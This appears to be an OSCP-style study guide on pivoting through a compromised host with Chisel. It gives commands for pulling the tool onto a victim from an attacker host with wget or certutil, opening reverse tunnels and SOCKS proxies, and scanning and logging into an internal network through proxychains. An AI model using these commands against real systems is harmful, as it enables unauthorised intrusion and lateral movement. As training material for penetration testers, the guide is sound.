### Chisel — Full Breakdown

---

### What is Chisel and Why Use It

```
SSH port forwarding requires SSH service on victim
Chisel works over HTTP/HTTPS — no SSH needed

Use Chisel when:
├── No SSH on victim
├── Windows victim (no SSH by default)
├── Firewall blocks SSH but allows HTTP/HTTPS
└── You only have RCE / web shell on victim
```

---

### How Chisel Works — Server and Client

```
Chisel always has TWO sides:

YOUR KALI  →  runs chisel SERVER
VICTIM     →  runs chisel CLIENT

Client always connects TO server
Server always on YOUR kali (usually)
```

---

### Uploading Chisel to Victim First

bash

```bash
# On your kali — find chisel
which chisel
# or download from github
wget https://github.com/jpillora/chisel/releases/latest

# Host it
cd /opt/chisel
python3 -m http.server 80

# On victim (linux)
wget http://YOUR_IP/chisel
chmod +x chisel

# On victim (windows)
certutil -urlcache -f http://YOUR_IP/chisel.exe chisel.exe
# or
iwr -uri http://YOUR_IP/chisel.exe -outfile chisel.exe
```

---

### All Four Scenarios — Matching SSH Flags

---

#### Scenario 1 — Local Port Forward (-L equivalent)

**"Access ONE service on victim's localhost"**

```
SSH equiv:  ssh -L 8080:127.0.0.1:80 user@victim
```

bash

```bash
# YOUR KALI (server)
chisel server -p 9001 --reverse

# VICTIM (client)
chisel client YOUR_IP:9001 R:8080:127.0.0.1:80
```

```
Breaking down victim command:

chisel client  YOUR_IP:9001   R  :  8080  :  127.0.0.1  :  80
                    │          │      │           │           │
                    │          │      │           │           └── service port
                    │          │      │           └────────────── destination IP
                    │          │      │                           (victim perspective)
                    │          │      └────────────────────────── port opens on YOUR kali
                    │          └───────────────────────────────── R = reverse
                    └──────────────────────────────────────────── your kali chisel server
```

```
Flow:

YOUR KALI                    VICTIM                    SERVICE
──────────────               ──────────────            ───────
curl 127.0.0.1:8080
        │
        ▼
port 8080 on kali
        │
        │── chisel tunnel ──► client receives ──► 127.0.0.1:80
                               connects to
                               its own localhost
```

---

#### Scenario 2 — Dynamic SOCKS Proxy (-D equivalent)

**"Use victim as proxy for WHOLE network"**

```
SSH equiv:  ssh -D 1080 user@victim
```

bash

```bash
# YOUR KALI (server)
chisel server -p 9001 --reverse

# VICTIM (client)
chisel client YOUR_IP:9001 R:socks
```

```
Breaking down victim command:

chisel client  YOUR_IP:9001   R:socks
                    │            │
                    │            └── R:socks = open SOCKS5 proxy
                    │                on YOUR kali port 1080 (default)
                    └─────────────── your kali chisel server
```

```
Flow:

YOUR KALI                    VICTIM                    INTERNAL NETWORK
──────────────               ──────────────            ────────────────
proxychains nmap
192.168.1.0/24
        │
        ▼
SOCKS5 proxy
127.0.0.1:1080
        │
        │── chisel tunnel ──► client receives ──► 192.168.1.20 ✅
                               proxies to           192.168.1.30 ✅
                               anywhere             192.168.1.40 ✅
                               it can reach
```

bash

```bash
# After running chisel R:socks
# proxychains.conf
socks5 127.0.0.1 1080

# Now use proxychains normally
proxychains -q nmap -sT -Pn 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.20 -u admin -p pass
proxychains crackmapexec smb 192.168.1.0/24
```

---

#### Scenario 3 — Remote Port Forward (-R equivalent)

**"Expose YOUR kali port to victim"**

```
SSH equiv:  ssh -R 4444:127.0.0.1:4444 kali@YOUR_IP
```

bash

```bash
# YOUR KALI (server)
chisel server -p 9001 --reverse

# VICTIM (client)
chisel client YOUR_IP:9001 4444:127.0.0.1:4444
```

```
Breaking down victim command:

chisel client  YOUR_IP:9001   4444  :  127.0.0.1  :  4444
                    │           │           │           │
                    │           │           │           └── port on YOUR kali
                    │           │           └────────────── YOUR kali IP
                    │           │                           (from victim perspective)
                    │           └────────────────────────── port opens on VICTIM
                    └──────────────────────────────────────── chisel server
```

```
Notice — NO R: prefix here
R: means port opens on YOUR kali
No R: means port opens on VICTIM
```

```
Use case — victim can reach your listener:

YOUR KALI                    VICTIM
──────────────               ──────────────
nc -lvnp 4444  ◄─────────── victim port 4444
                             forwards to
                             YOUR_IP:4444
```

---

#### Scenario 4 — Remote Dynamic SOCKS (-R dynamic equivalent)

**"Victim can't be reached, still make full SOCKS proxy"**

```
SSH equiv:  ssh -R 1080 kali@YOUR_IP  (run on victim)
```

bash

```bash
# YOUR KALI (server)
chisel server -p 9001 --reverse --socks5

# VICTIM (client)
chisel client YOUR_IP:9001 R:socks
```

Same as Scenario 2 — `R:socks` always means victim connects OUT to your server and creates SOCKS proxy on your kali regardless.

---

### R: vs No R: — The Most Confusing Part

```
WITH R: prefix
────────────────────────────────────────────
chisel client YOUR_IP:9001 R:8080:127.0.0.1:80

R: = REVERSE = port opens on YOUR KALI
     traffic flows: your kali:8080 → victim → destination
     (this is what you use 99% of the time in OSCP)


WITHOUT R: prefix
────────────────────────────────────────────
chisel client YOUR_IP:9001 8080:127.0.0.1:80

No R: = FORWARD = port opens on VICTIM
        traffic flows: victim:8080 → YOUR kali → destination
        (rare, used when you need victim to access your services)
```

---

### Custom SOCKS Port

bash

```bash
# Default SOCKS port is 1080
# To use different port:

# YOUR KALI
chisel server -p 9001 --reverse

# VICTIM
chisel client YOUR_IP:9001 R:2222:socks
#                             ↑
#                        SOCKS now on port 2222

# proxychains.conf
socks5 127.0.0.1 2222
```

---

### Multiple Tunnels — One Chisel Connection

bash

```bash
# Can forward multiple ports in ONE chisel command

# VICTIM
chisel client YOUR_IP:9001 R:8080:127.0.0.1:80 R:3306:127.0.0.1:3306 R:socks
#                           │                   │                       │
#                           │                   │                       └── SOCKS proxy
#                           │                   └────────────────────────── MySQL forward
#                           └────────────────────────────────────────────── Web forward
```

---

### Full Comparison — SSH vs Chisel

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  GOAL                   SSH                        CHISEL                   │
├─────────────────────────────────────────────────────────────────────────────┤
│  One port (you→victim)  ssh -L 8080:dst:80         R:8080:dst:80            │
│  Full proxy (you→victim)ssh -D 1080                R:socks                  │
│  One port (victim→you)  ssh -R 8080:dst:80         8080:dst:80              │
│  Full proxy (victim→you)ssh -R 1080                R:socks                  │
│  Needs SSH service?     YES                        NO (HTTP only)           │
│  Works on Windows?      needs OpenSSH              YES (single binary)      │
│  Firewall bypass?       needs port 22 open         works over 80/443        │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### OSCP Decision Flow — Complete

```
Have shell on victim, need to pivot?
│
├── SSH available on victim + you can reach it?
│    ├── One port needed?        → ssh -L
│    └── Whole network needed?   → ssh -D + proxychains
│
├── SSH available but you CANNOT reach victim directly?
│    ├── One port needed?        → ssh -R (victim runs it)
│    └── Whole network needed?   → ssh -R 1080 (victim runs it)
│
└── No SSH / Windows / HTTP only?
     ├── One port needed?        → chisel server --reverse
     │                             chisel client R:PORT:dst:PORT
     └── Whole network needed?   → chisel server --reverse
                                   chisel client R:socks
                                   + proxychains
```